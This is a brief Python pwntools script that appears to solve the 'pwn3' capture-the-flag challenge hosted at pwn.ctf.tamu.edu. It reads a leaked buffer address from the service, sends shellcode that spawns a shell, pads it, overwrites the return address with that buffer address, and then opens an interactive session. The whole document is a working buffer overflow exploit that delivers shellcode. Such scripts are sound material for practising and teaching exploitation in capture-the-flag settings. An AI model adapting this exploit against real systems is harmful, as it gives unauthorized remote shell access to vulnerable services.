#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
#r = process('/tmp/p/pwn3')
r = remote('pwn.ctf.tamu.edu', 4323)
r.recvuntil('random number ')
buf_addr = int(r.recvuntil('!')[:-1],16)
print "addr: ",hex(buf_addr)
sh = asm(shellcraft.sh()) 
payload = sh + "a"*198 + p32(buf_addr)

r.sendlineafter('? ', payload)

r.interactive()